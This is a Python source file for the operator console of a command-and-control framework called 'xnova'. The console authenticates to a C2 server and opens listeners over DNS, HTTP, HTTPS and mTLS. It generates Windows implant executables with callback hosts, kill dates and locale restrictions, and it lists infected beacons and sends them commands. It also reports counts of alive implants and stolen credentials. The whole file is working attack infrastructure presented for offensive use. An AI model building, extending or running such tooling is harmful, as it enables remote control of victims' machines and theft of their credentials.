import os
import re
import readline
import sys
import argparse
import urllib3
import base64
import warnings
import requests
import hashlib
import json
import threading
import time
import asyncio
from art import *
import websockets
import ssl
from argparse import SUPPRESS
from colorama import init as colorama_init
from colorama import Fore
from colorama import Style
import rich
from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
import warnings
from rich.table import Table
from rich.text import Text
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
import signal
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from rich.console import Console
from binascii import hexlify, unhexlify
import random, string
import datetime
import base64
import subprocess

from websockets.exceptions import *
warnings.simplefilter('ignore')

COMPILATION_ANALYTICS = 0

from rich.progress import Progress

REMOTE_SERVER_NAME = None

COMMANDS = ['generate', 'exit', 'help', 'listener', 'jobs', 'operator', 'chat', 'pending', "beacons", "use", "modules"]
help_message = {
                '  generate': 'generate implants. (generate --help)',
                '  exit': 'exit from C2.',
                '  help':'show help message.',
                '  listener':'create a DNS,http,https or mTLS listener job.',
                '  jobs':'list running jobs / listeners.',
                '  operator':'manage operators. (operator --help) (list / create / delete / modify)',
                '  chat':'start chat.',
                '  pending':'list pending artifacts (offline/online)',
                '  beacons':"list beacons.",
                '  use':"use <id> to interact with <id> beacon",
                '  modules':"list server modules."
                }
RE_SPACE = re.compile('.*\s+$', re.M)
server_secret = None
con_status = False
chat_open = False
PROGRESS_TASK = False
mainThreadSignal = False
cleanedUp = False

commandQueueOutput = []
commandQueueInput = []
ChatQueue = []
ChatMessageQueue = []
PayloadQueue = []
PendingQueue = []
IMPLANT_HISTORY = {}
user_defined_modules = {}

LAST_IMPLANT = None

requiredTasks = [False, False, False, False, False]

def rand_name(size=8):
    charss = string.ascii_letters + string.digits
    return ''.join(random.choice(charss) for _ in range(size))

def program_cleanup():
    global cleanedUp
    if cleanedUp == False:
        cleanedUp = True
        os.system('stty sane')
        print("\nbye!\n")

payload_build_order = {}

def misc_thread():
    while True:
        if len(PendingQueue) > 0:
            message = PendingQueue.pop(0)
            message = message.split('|')
            print(str("\n" + message[2]))


def receivePayload():
        global requiredTasks, payload_build_order, COMPILATION_ANALYTICS
        requiredTasks[4] = True
        while True:
            if mainThreadSignal == True:
                program_cleanup()
                os._exit(1)

            if len(PayloadQueue) > 0:
                message = PayloadQueue.pop(0)
                message = message.split('|')

                payload_uuid = message[2]
                payload_order = message[3]
                effective_payload = message[4]
                malware_pass = message[5]
                COMPILATION_ANALYTICS = message[6]

                if payload_uuid in payload_build_order:
                     payload_build_order[payload_uuid][payload_order] = {"payload":effective_payload, "password":malware_pass}
                else:
                    payload_build_order[payload_uuid] = {payload_order:{"payload":effective_payload, "password":malware_pass}}
                if all(key in payload_build_order.get(payload_uuid, {}) for key in ['0', '1']):
                    part1_payload = payload_build_order[payload_uuid]["0"]["payload"]
                    part2_payload = payload_build_order[payload_uuid]["1"]["payload"]
                    final_payload = part1_payload + part2_payload
                    decoded_binary = base64.b64decode(final_payload.encode('utf-8'))
                    random_name = rand_name(10)
                    output_folder_name = "./xnova_implants"
                    try:
                        os.mkdir(output_folder_name)
                    except:
                        pass
                    with open(f'{output_folder_name}/{random_name}.exe', "wb") as binary_file:
                        binary_file.write(decoded_binary)
                        binary_file.close()
                    rich.print(f"\n[!] Payload saved: '{output_folder_name}/{random_name}.exe' ( {malware_pass} )")


class OperatorUtils():
    def operatorHandler(self, operations=None):
        parser = argparse.ArgumentParser(usage=SUPPRESS)
        parser.add_argument('create', type=str, help='create operator: operator create (username) (password)')
        parser.add_argument('delete', type=str, help='delete operator: operator delete (username) (password)')
        parser.add_argument('modify', type=str, help='modify known operator: operator modify (username) (password) (new password)')
        parser.add_argument('list', type=str,   help='list operators: operator (without arguments)')

        try:
            if operations[1] in ('--help', '-h'):
                parser.print_help()
        except:
            pass
        
        global commandQueueInput
        if operations == None:
            commandQueueInput.append("operator|0")
            return 0

        if not operations[1] in ("create", "delete", "modify", "list"):
            print(f"command: 'operator {operations[1]}' does not exists.\n")
            return 0

        if operations[1] == 'create':
            username = operations[2]
            password = hashlib.sha512(operations[3].encode("utf-8")).hexdigest()
            commandQueueInput.append(f"operator|1|{username}|{password}")
            return 0
        if operations[1] == 'delete':
            username = operations[2]
            password = operations[3]
            commandQueueInput.append(f"operator|2|{username}|{password}")
            return 0

        if operations[1] == 'modify':
            username = operations[2]
            password = operations[3]
            newpassword = hashlib.sha512(operations[4].encode("utf-8")).hexdigest()
            commandQueueInput.append(f"operator|3|{username}|{password}|{newpassword}")
            return 0

        if operations[1] == "list":
            commandQueueInput.append("operator|0")
            return 0
            
    def chatSetup(self):
        global mainThreadSignal
        commandQueueInput.append("chat|0|public")
        while True:
            if mainThreadSignal == True:
                program_cleanup()
                sys.exit(1)
            if len(ChatQueue) > 0:
                setup = ChatQueue.pop(0)
                setup = setup.split('|')
                if setup[2] == 'setup':
                    return setup[3]
                break

    def sendMessage(self, message):
        if message != '':
            commandQueueInput.append(f"chat|1|{message}")

    def receiveMessage(self):
        global mainThreadSignal, requiredTasks
        while True:
            if mainThreadSignal == True:
                program_cleanup()
                sys.exit(1)
            if len(ChatMessageQueue) > 0:
                message = ChatMessageQueue.pop(0)
                message = message.split('|')
                print('\033[F' + message[3]+'\n', end='', flush=True)


    def startChat(self):
        global mainThreadSignal
        modifiers = self.chatSetup()
        messageSeekThread = threading.Thread(target=self.receiveMessage)
        messageSeekThread.start()
        print("\n #!exit to exit the chat room.\n #!join (group name) to join a group. \n #!list to list online users.\n")
        console = Console()
        try:
            while True:
                if mainThreadSignal == True:
                    program_cleanup()
                    sys.exit(1)
                message = console.input(f"\n\n{modifiers} > ")
                if message == '#!exit':
                    break
                self.sendMessage(message)
        except EOFError:
            return 0

import ast 
class CommandHandler:
    def commandInput(self):
        global mainThreadSignal, requiredTasks, PROGRESS_TASK
        try:
            requiredTasks[3] = True
            while True:
                if PROGRESS_TASK == True:
                    colorama_init()
                    readline.parse_and_bind("tab: complete")
                    comp = Completer()
                    generics = GenericUtils()
                    readline.set_completer(comp.complete)
                    console = Console()

                    try:
                        print("- Everything OK!\n")
                        generics.parse_command(console.input(f"({REMOTE_SERVER_NAME}) > "))
                        while True:
                            if mainThreadSignal == True:
                                program_cleanup()
                                sys.exit(1)
                            generics.parse_command(console.input(f"({REMOTE_SERVER_NAME}) > "))

                    except KeyboardInterrupt:
                        mainThreadSignal == True
                        program_cleanup()
                        sys.exit(1)
                    except Exception as err:
                        print(err)
                        pass
                else:
                    time.sleep(1)

        except Exception as err:
            print("commandInput: " + err)

    def commandOutput(self):
        global commandQueueOutput, mainThreadSignal, requiredTasks, IMPLANT_HISTORY, user_defined_modules, LAST_IMPLANT
        requiredTasks[2] = True
        decHandler = EncryptionHandler()
        
        while True:
            if mainThreadSignal == True:
                program_cleanup()
                sys.exit(1)

            while len(commandQueueOutput) > 0:
                message = decHandler.message_decrypt_AES(commandQueueOutput[0])
                position = message.find('DYNAMIC_QUEUE_RESOLVING')
                if position == -1:
                    commandQueueOutput.pop(0)
                else:
                    message_2 = message.split('|')
                    if message_2[1] == 'chat' and message_2[2] == 'message':
                        ChatMessageQueue.append(message)
                    if message_2[1] == 'beacon':
                        if message_2[2] == "c":
                            message_dec = base64.b64decode(message_2[4].encode())
                            rich.print(f'\n[!] Incomming response from "{message_2[3]}"\n')
                            rich.print(message_dec.decode() + "\n")

                    if message_2[1] == 'chat':
                        ChatQueue.append(message)
                    if message_2[1] == 'payload':
                        PayloadQueue.append(message)
                    if message_2[1] == "pending":
                        PendingQueue.append(message)
                    if message_2[1] == "listener":
                        if message_2[2] == "0":
                            table = Table(show_header=True, header_style="bold magenta")
                            table.add_column("Protocol", style="dim")
                            table.add_column("Name")
                            table.add_column("Address", justify="right")
                            console = Console()
                            dict_obj = ast.literal_eval(message_2[3])

                            for chave_externa, lista_de_dicionarios in dict_obj.items():
                                for dicionario_interno in lista_de_dicionarios:
                                    for chave, valor in dicionario_interno.items():
                                        table.add_row(
                                            chave_externa, chave, str(valor)
                                        )
                            print("")
                            console.print(table)
                        
                        if message_2[2] == "err":
                            if message_2[3] == "name":
                                rich.print(f"\n[!] listener named {message_2[4]} already exists.")

                            if message_2[3] == "addr":
                                rich.print(f"\n[!] listener already running at {message_2[4]}.")
                        
                        if message_2[2] == "ok":
                            rich.print(f"\n[?] listener started.")


                    if message_2[1] == "global":
                        if message_2[2] == "0":
                            rich.print(f"\n[!] New implant connected! {message_2[3]} - {message_2[4]} (server time)")
                            LAST_IMPLANT = message_2[3]
                            IMPLANT_HISTORY[message_2[3]] = {"first_seen":message_2[4], "last_seen":message_2[4]}
                            
                        if message_2[2] == "1":
                            try:
                                IMPLANT_HISTORY[message_2[3]]["last_seen"] = message_2[4]
                            except:
                                pass

                        if message_2[2] == "3":
                            dict_obj = ast.literal_eval(message_2[3])
                            IMPLANT_HISTORY = dict_obj

                        if message_2[2] == "modules":
                            dict_obj = ast.literal_eval(message_2[3])
                            user_defined_modules = dict_obj
                        


                    commandQueueOutput.pop(0)
def ask_exit():
    loop = asyncio.get_event_loop()
    for task in asyncio.Task.all_tasks():
        task.cancel()
    loop.stop()


class EncryptionHandler():
    def message_encrypt_AES(self, message):
        key = bytes.fromhex(server_secret)
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_message = padder.update(message.encode()) + padder.finalize()

        iv = os.urandom(algorithms.AES.block_size // 8)

        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())

        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(padded_message) + encryptor.finalize()
        return iv + ciphertext


    def message_decrypt_AES(self, encrypted_message):
        global server_secret
        key = bytes.fromhex(server_secret)
        iv = encrypted_message[:algorithms.AES.block_size // 8]
        ciphertext = encrypted_message[algorithms.AES.block_size // 8:]

        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
        decryptor = cipher.decryptor()

        padded_message = decryptor.update(ciphertext) + decryptor.finalize()

        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        decrypted_message = unpadder.update(padded_message) + unpadder.finalize()

        return decrypted_message.decode()

class ConnectionHandler(object):
    def get_certificate_fingerprint(self, cert_path):
        with open(cert_path, 'rb') as cert_file:
            cert_data = cert_file.read()
            cert = x509.load_pem_x509_certificate(cert_data, default_backend())
            fingerprint = cert.fingerprint(hashes.SHA256()).hex()
            return fingerprint

    def serverLogin(self, args):
        global requiredTasks, REMOTE_SERVER_NAME
        try:
            encHandler = EncryptionHandler()
            global server_secret, con_status, mainThreadSignal
            server_secret = args.c2pass
            uri = "https://" + args.remote + '/'
            data = {"creds": base64.b64encode(encHandler.message_encrypt_AES(args.username + ':' + args.password)).decode('utf-8')}
            try:
                result = requests.post(uri + 'auth', cert=(args.clientcert, args.clientkey),verify=False,json=data)
            except Exception as err:
                print("Failed to establish a connection with the server: " + err)
                program_cleanup()
                mainThreadSignal = True
                return 1

            if not 'Authorization' in result.headers:
                print(f" \n{Fore.RED}(!) Access denied or this is not a xnova C2.{Style.RESET_ALL}")
                os.kill(os.getpid(), signal.SIGINT)

            analytics_header = result.headers['Analytics']
            server_analytics = json.loads(encHandler.message_decrypt_AES(unhexlify(analytics_header)).replace("'", '"'))

            REMOTE_SERVER_NAME = result.headers['ServerName']
            print("")
            print(result.headers['Version'])
            print(f"    {Fore.CYAN}Unique server identifier:{Style.RESET_ALL} [{result.headers['Identifier']}]")
            print(f"    {Fore.CYAN}Online:{Style.RESET_ALL} [{server_analytics['online']}]")
            print(f"    {Fore.CYAN}Operators:{Style.RESET_ALL} [{server_analytics['operators']}]")
            print(f"    {Fore.CYAN}Alive implants:{Style.RESET_ALL} [{server_analytics['alive']}]")
            print(f"    {Fore.CYAN}Dead implants:{Style.RESET_ALL} [{server_analytics['dead']}]")
            print(f"    {Fore.CYAN}Sleeping implants:{Style.RESET_ALL} [{server_analytics['sleep']}]")
            print(f"    {Fore.CYAN}Credentials:{Style.RESET_ALL} [{server_analytics['creds']}]\n")
            con_status = True
            requiredTasks[1] = True
            return result.headers['Authorization']
        except Exception as err:
            print("[ERR] serverLogin: " + err)

        
    async def interactWithWebSocket(self, args, token):
        global server_secret, con_status, commandQueueOutput, commandQueueInput, mainThreadSignal
        try:
            encHandler = EncryptionHandler()
        
            while True:
                if con_status == False:
                    pass
                else:
                    break

            server_secret = args.c2pass
            address = args.remote.split(':')[0]
            uri = "wss://" + address + ':' + args.wssport
            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)

            ssl_context.load_verify_locations(args.clientcert)
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            headers = {'Authorization':f'{token}'}
            ws = None

            async with websockets.connect(uri, ssl=ssl_context, extra_headers=headers) as websocket:
                requiredTasks[0] = True
                ws = websocket

                while True:
                    if mainThreadSignal == True:
                        program_cleanup()
                        sys.exit(1)

                    if len(commandQueueInput) > 0:
                        # dispatch command
                        await websocket.send(encHandler.message_encrypt_AES(commandQueueInput[0]))
                        commandQueueInput.pop(0)
                    try:
                        message = await asyncio.wait_for(websocket.recv(), timeout=0.1)
                        commandQueueOutput.append(message)
                    except KeyboardInterrupt:
                        program_cleanup()
                        os._exit(1)
                    except RuntimeWarning:
                        program_cleanup()
                        os._exit(1)
                        
                    except asyncio.exceptions.TimeoutError: 
                        pass

        except ConnectionRefusedError:
            print(f"{Fore.RED}(!) Failed to estabilish a connection with server: {Style.RESET_ALL}{uri}\n")
            sys.exit()

        except websockets.exceptions.ConnectionClosedError as exception:
            print(f"{Fore.RED}(!) Internal server error, report it to the developers...{Style.RESET_ALL}\nException: {exception}\n")
            sys.exit()

        except KeyboardInterrupt:
            mainThreadSignal = True
            program_cleanup()
            os._exit(1)
        except RuntimeWarning:
            program_cleanup()
            os._exit(1)
            

        except:
            pass
            


    def __init__(self, args):
        try:
            authorization = self.serverLogin(args)
            if authorization != 1:
                asyncio.run(self.interactWithWebSocket(args, authorization))
            program_cleanup()
            os._exit(1)
        except KeyboardInterrupt:
            program_cleanup()
            os._exit(1)

class ListenerUtils():
    def create_listener(self, args):
        try:
            if len(args) == 0:
                commandQueueInput.append(f"listener|0")
                return 0

            parser = argparse.ArgumentParser(usage=SUPPRESS)
            parser.error = lambda message: f'  {Fore.RED}(!) unknown flags. {message}{Style.RESET_ALL}'


            parser.add_argument('--dns', type=str, help='start a DNS listener for domain. (example: dns.localhost.local)')
            parser.add_argument('--http', type=str, help='start a HTTP listener. (example: 127.0.0.1:8080)')
            parser.add_argument('--https', type=str, help='start a HTTPS listener. (example: 127.0.0.1:8443)')
            parser.add_argument('--mtls', type=str, help='start a mTLS listener. (example: 127.0.0.1:1337)')
            parser.add_argument('--allowed', type=str, help='remote IP address allowed. (example: 127.0.0.1)')
            parser.add_argument('--name', type=str, help='name of the profile.', required=True)

            if len(args) < 1:
                parser.print_help()

            args = parser.parse_args(args)  

            namespace_dict = vars(args)

            guardrails = "noguard"
            if namespace_dict["allowed"] != None:
                guardrails = args.allowed

            if namespace_dict["dns"] != None:
                commandQueueInput.append(f'listener|1|dns|{namespace_dict["dns"]}|{args.name}|{guardrails}')
                return

            if namespace_dict["http"] != None:
                commandQueueInput.append(f'listener|1|http|{namespace_dict["http"]}|{args.name}|{guardrails}')
                return

            if namespace_dict["https"] != None:
                commandQueueInput.append(f'listener|1|https|{namespace_dict["https"]}|{args.name}|{guardrails}')
                return

            if namespace_dict["mtls"] != None:
                commandQueueInput.append(f'listener|1|mtls|{namespace_dict["mtls"]}|{args.name}|{guardrails}')
                return




        except Exception as err:
            print(err)
            pass

class PayloadUtils():
    def payload_generation(self, args):
        try:

            parser = argparse.ArgumentParser(usage=SUPPRESS)
            parser.error = lambda message: f'  {Fore.RED}(!) unknown flags. {message}{Style.RESET_ALL}'
            parser.add_argument('--lhost', type=str, help='remote host to connect over tcp,mtls protocols. (example: 127.0.0.1)')
            parser.add_argument('--lport', type=int, help='remote port to connect over tcp,mtls protocols. (example: 1337)')
            parser.add_argument('--proto', type=str, choices=['http', 'https', 'dns', 'tcp', 'mtls'], help='connection protocol.')
            parser.add_argument('--constring', type=str, help='connection string for http,https,dns protocols. (example: https://127.0.0.1/. default: None / Mandatory)')
            parser.add_argument('--locale', type=str, help='implant will work only in this locate. (example: En-US. default: None)',default=None)
            parser.add_argument('--killdate', type=str, help='implant will die after MM-DD-YYYY. (default: None)',default=None)
            parser.add_argument('--disposable', type=bool, default=True, help='implant is disposable? (disposable implants can only run once per build. default: Yes)')
            parser.add_argument('--sleep', type=int, default=50, help='implant sleep time in seconds (default: 50s)')
            if len(args) < 1:
                parser.print_help()

            args = parser.parse_args(args)  
            rich.print("[?] implant generation in queue.")
            if args.proto == 'tcp':
                if args.lhost == None or args.lport == None:
                    print(f"  {Fore.RED}(!) lhost and lport arguments are mandatory with tcp protocol, see 'generate --help'{Style.RESET_ALL}")
                    return 0

            if args.proto == 'http' or args.proto == 'https':
                if args.constring == None:
                    print(f"  {Fore.RED}(!) connection string (--constring) arguments are mandatory in http protocol, see 'generate --help'{Style.RESET_ALL}")
                    return 0
            

            if args.proto == 'tcp':
                commandQueueInput.append(f"generate|tcp|{args.lhost}:{args.lport}|{args.locale}|{args.killdate}|{args.disposable}|{args.sleep}")
            
            if args.proto == 'http':
                commandQueueInput.append(f"generate|http|{args.constring}|{args.locale}|{args.killdate}|{args.disposable}|{args.sleep}")

            if COMPILATION_ANALYTICS > 0:
                rich.print(f"compilation could take up to {COMPILATION_ANALYTICS:.2f} minutes...")


        except:
            pass

class MiscUtils():
    def getPendingArtifacts(self):
        commandQueueInput.append(f"pending|0")

class BeaconController():
    def listModules(self):
        global user_defined_modules
        for k, v in user_defined_modules.items():
            rich.print(f'{k}: {v["module_description"]}')

    def listFiles(self):
        commandQueueInput.append(f"pending|0")

    def parse_command(self, command):
        try:
            if command != "":
                command = command.split()
            else:
                return
            if command[0] == "ls":
                self.listFiles() 
        except:
            pass

    def listBeacons(self):
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("ID", style="dim")
        table.add_column("First Seen")
        table.add_column("Last Seen", justify="right")
        table.add_column("Uptime", justify="right")
        console = Console()

        global IMPLANT_HISTORY
        for key, value in IMPLANT_HISTORY.items():
            if value["first_seen"] != False:
                format_str = "%Y-%m-%d %H:%M:%S"
                first_seen = datetime.datetime.strptime(value["first_seen"], format_str)
                last_seen = datetime.datetime.strptime(value["last_seen"], format_str)

                table.add_row(
                    key, str(first_seen), str(last_seen), str((last_seen - first_seen))
                )

        console.print(table)

    def useBeacon(self, beacon_id):
        while True:
            try:
                if beacon_id[1] not in IMPLANT_HISTORY:
                    rich.print(f'beacon {beacon_id} not found...')
                    return
                console = Console()
                command = console.input(f"{beacon_id[1]} > ")
                if command == "back":
                    break
                if command == "help":
                    print("back: return to main menu.")
                    for k, v in user_defined_modules.items():
                        rich.print(f'{k}: {v["module_description"]}')

                if command == "beacons":
                    self.listBeacons()
                    
                command = command.split()
                if command[0] in user_defined_modules:
                    commandQueueInput.append(f"beacon|{beacon_id[1]}|{command}")

                if command[0][0] == "!":
                    try:
                        new_word = command[0][1:]
                        command[0] = new_word
                        cmd_result = subprocess.run(command, capture_output=True, text=True)
                        if cmd_result.returncode == 0:
                            print(cmd_result.stdout)
                        else:
                            print(cmd_result.stderr)
                    except:
                        pass
            except:
                continue
            # self.parse_command(command)




class GenericUtils():
    def parse_command(self, command):
        global LAST_IMPLANT
        SYSTEM_CMDLINE = False
        try:
            if command != "":
                command = command.split()
            else:
                return

            if command[0][0] == "!":
                SYSTEM_CMDLINE = True
                try:
                    new_word = command[0][1:]
                    command[0] = new_word
                    cmd_result = subprocess.run(command, capture_output=True, text=True)
                    if cmd_result.returncode == 0:
                        print(cmd_result.stdout)
                    else:
                        print(cmd_result.stderr)
                except:
                    pass

            if command[0] == 'exit':
                print('bye.\n')
                sys.exit(0)

            if command[0] == 'generate':
                pClass = PayloadUtils()
                pClass.payload_generation(command[1:])

            if command[0] == 'listener':
                pClass = ListenerUtils()
                pClass.create_listener(command[1:])

            if command[0] == 'help':
                for key_help, value_help in help_message.items():
                    rich.print(f'{key_help}: {value_help}')

            if command[0] == 'chat':
                operator = OperatorUtils()
                operator.startChat()
            if command[0] == "pending":
                pClass = MiscUtils()
                pClass.getPendingArtifacts()

            if command[0] == "modules":
                pClass = BeaconController()
                pClass.listModules()
            
            if command[0] == 'operator':
                operator = OperatorUtils()
                if len(command) > 1:
                    operator.operatorHandler(command)
                else:
                    operator.operatorHandler()

            if command[0] == "beacons":
                pClass = BeaconController()
                pClass.listBeacons()

            if command[0] == "use":
                if len(command) > 1:
                    pClass = BeaconController()
                    pClass.useBeacon(command)
                if len(command) == 1:
                    if LAST_IMPLANT != None:
                        command.append(LAST_IMPLANT)
                        pClass = BeaconController()
                        pClass.useBeacon(command)

            if SYSTEM_CMDLINE == False and not command[0] in COMMANDS:
                print(f"  {Fore.RED}(!) unknown command: {Style.RESET_ALL}{Fore.BLUE}{command[0]}{Style.RESET_ALL}")

        except Exception as err:
            print(err)
            command = ' '.join(command)
            if command != "":
                print(f" error while running: {' '.join(command)}")

class Completer(object):

    def complete(self, text, state):
        "Generic readline completion entry point."
        buffer = readline.get_line_buffer()
        line = readline.get_line_buffer().split()
        # show all commands
        if not line:
            return [c + ' ' for c in COMMANDS][state]
        # account for last argument ending in a space
        if RE_SPACE.match(buffer):
            line.append('')
        # resolve command to the implementation function
        cmd = line[0].strip()
        if cmd in COMMANDS:
            impl = getattr(self, 'complete_%s' % cmd)
            args = line[1:]
            if args:
                return (impl(args) + [None])[state]
            return [cmd + ' '][state]
        results = [c + ' ' for c in COMMANDS if c.startswith(cmd)] + [None]
        return results[state]

def logging_thread():
    global requiredTasks, PROGRESS_TASK
    blacklist = []
    requiredTasks[4] = True
    with Progress(transient=True) as progress:
        taskC = 0
        task = progress.add_task("Starting", total=len(requiredTasks))
        while not all(requiredTasks):
            for i, reqTasks in enumerate(requiredTasks):
                if len(blacklist) == len(requiredTasks):
                    break
                if i in blacklist:
                    continue
                if reqTasks == True:
                    blacklist.append(i)
                    progress.advance(task)
        
        PROGRESS_TASK = True
        return

if __name__ == 'xnova' or __name__ == '__main__':
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    parser = argparse.ArgumentParser()
    parser.add_argument('--remote', type=str, help='C2 (management) server address. (example: 127.0.0.1:8472)', required=True)
    parser.add_argument('--username', type=str, help='operator username.', required=True)
    parser.add_argument('--password', type=str, help='operator password.', required=True)
    parser.add_argument('--2fa', type=str, help='operator 2fa.', required=True)
    parser.add_argument('--clientcert', type=str, help='client TLS certificate.', required=True)
    parser.add_argument('--clientkey', type=str, help='client TLS key.', required=True)
    parser.add_argument('--c2pass', type=str, help='C2 password.', required=True)
    parser.add_argument('--wssport', type=str, help='C2 WSS port.', required=True)
    args = parser.parse_args()
    os.system('cls' if os.name=='nt' else 'clear')
    command_handler = CommandHandler()

    print(text2art("xnova","rand"))
    print('a modular rust c2 framework.\n\nuse \'help\' to show the available commands.\n - sending tha whole industry to hell since 2024.')
    command_handler_t = threading.Thread(target=command_handler.commandInput)
    command_handler_t.start()

    command_handler_t2 = threading.Thread(target=command_handler.commandOutput)
    command_handler_t2.start()

    command_handler_t3 = threading.Thread(target=receivePayload)
    command_handler_t3.start()

    command_handler_t4 = threading.Thread(target=logging_thread)
    command_handler_t4.start()

    command_handler_t5 = threading.Thread(target=misc_thread)
    command_handler_t5.start()


    conHandler = ConnectionHandler(args)